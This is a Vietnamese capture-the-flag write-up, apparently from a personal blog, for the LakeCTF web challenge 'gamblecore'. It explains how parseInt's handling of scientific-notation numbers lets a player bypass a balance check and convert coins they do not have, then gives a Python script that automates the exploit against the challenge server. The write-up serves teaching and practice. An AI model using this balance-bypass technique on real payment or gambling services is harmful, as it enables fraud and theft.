@@ -1,0 +1,365 @@
+---
+title: 'CASINO GAMBLECORE'
+date: '2025-11-29'
+description: 'Writeup chi tiết về challenge GAMBLECORE'
+ctf: 'CTF Challenge'
+category: 'Web Exploitation'
+difficulty: 'Medium'
+tags: ['Business Logic Error', 'Type Juggling']
+---
+
+<div className="writeup-content-small">
+
+<h1 className="writeup-title">GAMBLECORE</h1>
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/banner.avif"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Mở đầu</h2>
+
+LakeCTF là một giải được tổ chức bởi CTF **polygl0ts**, thường diễn ra theo format Jeopardy, gồm nhiều danh mục như Web, Pwn, Misc,...
+<br />
+Giải lần này gồm 3 bài về Web, sau đây là một trong số đó: **gamblecore**
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Bắt đầu thôi</h2>
+
+Khi nhấn vô link challenge ta được đưa tới 1 trang web đánh bạc:
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/home.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Về cơ bản thì trang có những nội dung sau:
+<br />
+Bạn có 2 loại tiền chính trong ví, đó là `coins` và `USD`. Tuy nhiên trong giao diện web sẽ hiển thị đơn vị là microcoins (tức là 1 coins = 1000000 microcoins). 
+<br />
+Tiếp theo, bạn có thể đánh bạc. Có tùy chọn đơn vị là microcoins và USD (ban đầu USD là 0 nên không đánh được). Nếu số tiền bạn nhập vào hợp lệ thì tiến hành đánh bạc.
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/gamble.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Tỉ lệ ăn là 9%, nếu thắng, bạn được gấp 10 số tiền cược, ngược lại, bạn mất số tiền đó. Bạn cược theo đơn vị tiền nào thì số tiền thắng được cộng vào ví tương ứng với loại tiền đó.
+
+<br />
+Tiếp theo, khi có lượng coins đủ lớn. Bạn có thể đổi coins ra thành USD và cầm về (chắc rút để tiêu...). <br />
+Để đổi được ra USD, bạn cần có nhập lượng coins là số nguyên (coins chứ không phải microcoins nhé). Với mỗi coin thì đổi được 0.01 USD. 
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/convert.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Mục tiêu của challenge là đánh bạc bằng cách nào đó để có được 10 USD. Sau đó cầm 10 USD này để mua Flag (từ chợ đen) và win.
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/buy.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Vấn đề của challenge này là ở chỗ: làm sao để kiếm được 10 USD?
+<br />
+Ban đầu bạn có 10 microcoins (tức 0.00001 coins). Nếu đánh thắng thì số coins đó x10, có 1 coin thì đổi được 0.01 USD. Tuy nhiên tỉ lệ đánh thắng là 9%, còn đánh thắng ăn x10, tức là càng đánh nhiều càng lỗ??
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/thinking.avif"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Quan sát Burp một chút xem sao.
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/burp_balance.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/burp_gamble.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+
+Vì challenge này được cung cấp source code, mình cũng tiến hành đọc thử. Các dữ liệu nhập vào cũng được xử lý khá kĩ. Chúng yêu cầu khác **null** và phải **dương**, sau đó được đưa qua `parseInt` hoặc `parseFloat` để lấy dạng số học, số tiền đánh bạc và số tiền để convert ra USD không được quá số tiền đang có.
+
+<br />
+Trong code có 2 api chính (và có lẽ chỉ chúng mới có khả năng bị lỗi), đó là `/api/gamble` và `/api/convert`.
+
+<br />
+Vậy mấu chốt của bài này là ở đâu?? Quan sát thêm thì thấy logic if else không hề có vấn đề gì cả. Các hàm random để hỗ trợ chức năng đánh bạc cũng không bị lỗi.
+
+<br />
+
+Như thế, có lẽ nào lỗi nằm ở các hàm `parse` kia? Bạn có thể đọc đoạn code sau để hiểu rõ hơn phân tích trên của mình.
+```
+app.post('/api/gamble', (req, res) => {
+    const { currency, amount } = req.body;
+    
+    if (!['coins', 'usd'].includes(currency)) {
+        return res.status(400).json({ error: 'Invalid currency' });
+    }
+
+    let betAmount = parseFloat(amount);
+    if (isNaN(betAmount) || betAmount <= 0) {
+        return res.status(400).json({ error: 'Invalid amount' });
+    }
+
+    const wallet = req.session.wallet;
+    
+    if (currency === 'coins') {
+        if (betAmount > wallet.coins) {
+            return res.status(400).json({ error: 'Insufficient funds' });
+        }
+    } else {
+        if (betAmount > wallet.usd) {
+            return res.status(400).json({ error: 'Insufficient funds' });
+        }
+    }
+
+    // Deduct bet
+    if (currency === 'coins') wallet.coins -= betAmount;
+    else wallet.usd -= betAmount;
+
+    // 9% chance to win
+    const win = secureRandom() < 0.09;
+    let winnings = 0;
+
+    if (win) {
+        winnings = betAmount * 10;
+        if (currency === 'coins') wallet.coins += winnings;
+        else wallet.usd += winnings;
+    }
+
+    res.json({
+        win: win,
+        new_balance: currency === 'coins' ? wallet.coins : wallet.usd,
+        winnings: winnings
+    });
+});
+```
+
+```
+app.post('/api/convert', (req, res) => {
+    let { amount } = req.body;
+
+    const wallet = req.session.wallet;
+    const coinBalance = parseInt(wallet.coins);
+    amount = parseInt(amount);
+    if (isNaN(amount) || amount <= 0) {
+        return res.status(400).json({ error: 'Invalid amount' });
+    }
+    
+    if (amount <= coinBalance && amount > 0) {
+        wallet.coins -= amount;
+        wallet.usd += amount * 0.01;
+        return res.json({ success: true, message: `Converted ${amount} coins to $${(amount * 0.01).toFixed(2)}` });
+    } else {
+        return res.status(400).json({ error: 'Conversion failed.' });
+    }
+});
+```
+
+Google một lúc thì mình phát hiện lỗi có thể đến từ `parseInt` khi dữ liệu nhập vào là **số**, chứ không phải String, cụ thể trong đoạn code về convert ở trên, dòng 5 và 6.
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/stackoverflow.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Number sẽ được chuyển sang chuỗi bằng ToString(number). Ví dụ: parseInt(5e3) -> 5e3 là số -> ToString(5e3) -> 5000.
+
+
+<br />
+Nếu số rất nhỏ (5e-7 chẳng hạn) -> ToString(5e-7) -> "5e-7" (chuyển thành dạng khoa học) -> parseInt("5e-7") -> 5.<br /> Hoặc nếu nhập vào 0.0000005 -> cũng xử lý ra string "5e-7" và được kết quả là 5.
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Nhìn lại vấn đề</h2>
+
+Rõ ràng, nếu cứ đánh bạc bình thường thì mình sẽ chẳng bao giờ có nổi 1 coin và đổi ra USD mất (vì ban đầu có 0.00001 coin). Tệ hơn, số tiền ăn và tỉ lệ thắng kết hợp lại, tính theo xác suất cơ bản thì càng đánh càng lỗ.
+<br />
+Nếu chơi tất tay với 0.00001 coin ban đầu, giả sử đánh ăn liên tiếp thì mình cần đánh tận 8 lần. Với xác suất thắng 9% (0.09) thì tỉ lệ được 1 lần thắng 8 ván liên tiếp là 0.09^8 = 4.3046721e-9 -> Đánh tận 232305732 lần thì có cơ may ăn một lần.
+
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Hack thôi</h2>
+
+Từ lỗi `parseInt` trong `/api/convert`, nếu số dư tài khoản (`wallet.coins`) đủ bé để đưa được về dạng khoa học (tức nhỏ hơn 10^-6). Giả sử ở dạng `A.xxxxx e-z` đi (ví dụ 8.999e-7) (trong đó A là số nguyên từ 0 đến 9). 
+```
+const wallet = req.session.wallet;
+const coinBalance = parseInt(wallet.coins);
+```
+Từ đây coinBalance chính là A.<br />
+Tiếp theo ta cho amount trong `amount = parseInt(amount);` là B (số không vượt quá A).<br />
+Như vậy đã thỏa mãn đoạn code và ta có B coins (coins chứ không phải microcoins nhé) đổi thành usd.
+<br />
+<br />
+Giả sử lúc này tài khoản ta như sau:
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/old.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Tiến hành đổi:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/convert_success.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Và ta có:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/new.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Một vấn đề nữa, sau khi đổi thế này thì số tiền dạng coins của ta đã bị âm. <br />
+Theo code của `/api/gamble` thì ta không thể tiến hành đánh bạc bằng đơn vị tiền microcoins được nữa (vì nó yêu cầu nhập vào số dương để đánh bạc, số tiền đó không được vượt quá số tiền trong ví, nhưng mà số tiền trong ví lại âm mất rồi).
+
+<br />
+
+Lúc này chỉ còn số tiền dạng USD là đánh bạc được. Nút convert từ đây cũng vô dụng (vì phải đổi từ coins sang USD, một lần nữa nó yêu cầu nhập giá trị dương, giá trị này không được quá số tiền đang có).
+
+<br />
+Loay hay thêm một lúc mình không nghĩ ra cách gì được nữa. Bây giờ đành đánh bạc thật thôi...
+
+<br />
+
+Tương tự suy nghĩ ở phần "Đặt vấn đề". Giờ ta có 0.09 USD, đánh all in thắng 1 lần ta được 0.9 USD, đánh all in tiếp mà thắng thì được 9 USD, all in lần nữa ta có 90 USD (và ta giải được challenge do có 10 USD mua Flag) -> Như vậy phải win 3 lần liên tiếp.
+
+
+<br />
+Tóm lại làm như sau:
+
+```
+1. Đánh bạc với 9.1 microcoin
+2. Nếu thắng thì reset session và đánh lại.
+3. Nếu thua thì ta có số tiền như ảnh trên (0.900000000000016 microcoins).
+4. Đổi 9 coins ra USD và đổi được do lỗi đã phân tích.
+5. Cầm số tiền này đánh all in liên tiếp cho đến khi được 90 USD.
+6. Vì all in nên cứ thua là hết sạch tiền -> reset session và quay lại bước 1.
+```
+Xác xuất để thắng 3 lần liên tiếp là 0.09^3 -> đánh khoảng 1400 lần thì ăn 1, khả thì hơn lúc nãy rất nhiều rồi đúng không nào.
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/casino/get_flag.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Mình quá may mắn nên đánh 40 lần là ăn. Flag: `EPFL{we_truly_live_in_a_society}`
+
+Đoạn code python để chạy thử:
+
+```
+import requests
+
+URL = "https://chall.polygl0ts.ch:8148/"
+
+def exploit():
+    attempts = 0
+
+    while True:
+        attempts += 1
+        print(f"\n[*] Attempt #{attempts}")
+        session = requests.Session()
+
+        # Bước 1: Đánh bạc để giảm amount về dạng ~~ 9e-7
+
+            # Ban đầu có 1e-5 -> trừ đi số kia thì còn lại ~9e-7
+        burn_amount = 0.0000091
+        print(f"[*] Burning coins amount: {burn_amount}")
+        res = session.post(f"{URL}/api/gamble", json={
+            "currency": "coins",
+            "amount": burn_amount
+        })
+        
+        new_balance = res.json()
+        print(f"[*] Coins balance after burn: {new_balance['new_balance']}")
+        
+        if(new_balance["new_balance"] > 0.00001):
+            print(f"[!] Balance too high, retrying...")
+            continue
+
+        # Bước 2: Tận dụng hàm convert để có được 0.09$
+
+        print(f"[*] Converting 9 coins to USD...")
+        res = session.post(f"{URL}/api/convert", json={"amount": 9})
+        print(f"[*] Convert response: {res.json()}")
+
+        res = session.get(f"{URL}/api/balance")
+        balances = res.json()
+        print(f"[*] Current balances: {balances}")
+
+        current_usd = balances["usd"]
+
+        print(f"[+] Starting USD: {current_usd}")
+        
+        while current_usd < 10:
+            print(f"[*] Gambling with USD: {current_usd}")
+            res = session.post(f"{URL}/api/gamble", json={
+                "currency": "usd",
+                "amount": current_usd
+            })
+
+            data = res.json()
+            print(f"[*] Gamble result: {data}")
+
+            if(data.get("win")):
+                current_usd = data["new_balance"]
+                print(f"[+] WIN! New balance: {current_usd}")
+            else:
+                print(f"[-] LOSS! Stopping this attempt.")
+                break
+            
+        if current_usd >= 10:
+            print(f"[+] Exploit successful in {attempts} attempts! Final USD Balance: {current_usd}")
+            
+            print(f"[*] Retrieving flag...")
+            res = session.post(f"{URL}/api/flag")
+
+            print(f"[+] FLAG: {res.json()}")
+
+            break
+
+
+
+if __name__ == "__main__":
+    exploit()
+```
+
+</div>
